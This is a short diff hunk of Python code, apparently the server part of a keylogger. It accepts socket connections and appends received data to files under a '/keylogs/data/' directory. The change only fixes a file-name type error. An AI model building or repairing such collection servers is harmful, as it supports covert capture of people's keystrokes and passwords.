@@ -31,7 +31,7 @@ def receiver():
     client_socket, client_address = server_socket.accept()
     print(f"connexion de {client_address}")
 
-    ficname = client_address + str(datetime.date.today())
+    ficname = str(client_address) + str(datetime.date.today())
     # recu data
     with open("/keylogs/data/"+ficname, "a") as f:
         data = client_socket.recv(1024)
